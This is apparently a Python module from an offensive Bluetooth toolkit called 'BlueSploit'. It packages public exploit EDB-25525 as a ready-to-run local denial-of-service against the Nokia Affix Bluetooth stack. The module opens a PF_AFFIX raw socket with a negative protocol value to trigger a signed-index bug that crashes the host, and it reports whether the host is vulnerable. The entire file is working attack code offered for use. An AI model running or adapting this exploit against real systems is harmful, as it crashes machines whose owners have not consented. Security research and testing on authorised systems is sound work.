"""
BlueSploit Module: Nokia Affix Stack Signed Proto DoS
EDB-ID: 25525  (BID 13347)

Local DoS against the Nokia Affix Bluetooth stack: opens a
PF_AFFIX/SOCK_RAW socket with proto=-31337. Signed-index bug in
Affix's protocol dispatcher → host crash.

PF_AFFIX is not registered on stock Linux — module reports cleanly
when the address family is unknown.
"""

import socket
from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import print_error, print_info, print_warning, print_success, Colors


PF_AFFIX  = 27       # Affix's chosen family number
NEG_PROTO = -31337


class Module(DosModule):
    info = ModuleInfo(
        name="dos/nokia_affix_signed_proto",
        description="Nokia Affix BT stack signed-proto DoS (EDB-25525)",
        author=["kf_lists @ digitalmunition"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.LOW,
        references=[
            "https://www.exploit-db.com/exploits/25525",
            "https://www.securityfocus.com/bid/13347",
        ],
    )

    def _setup_options(self) -> None:
        self.options = {
            "proto": ModuleOption(
                name="proto", required=False, default=NEG_PROTO,
                description="Negative proto value passed to socket()",
            ),
        }

    def run(self) -> bool:
        proto = int(self.get_option("proto"))
        C = Colors
        print(f"\n  {C.RED}{'─'*55}{C.RESET}")
        print(f"  {C.BOLD}Nokia Affix Signed-Proto DoS (EDB-25525){C.RESET}")
        print(f"  {C.RED}{'─'*55}{C.RESET}")
        print_warning("Targets LOCAL Affix Bluetooth stack")
        print_info(f"socket(PF_AFFIX={PF_AFFIX}, SOCK_RAW, {proto})")

        try:
            s = socket.socket(PF_AFFIX, socket.SOCK_RAW, proto)
            s.close()
            print_success("Affix accepted socket — vulnerable host detected")
            self.add_result({"edb_id": 25525, "vulnerable": True})
        except OSError as e:
            print_info(f"socket() rejected: {e} — Affix not present or patched")
            self.add_result({"edb_id": 25525, "vulnerable": False, "errno": e.errno})
        except Exception as e:
            print_error(f"Error: {e}")
            return False
        return True
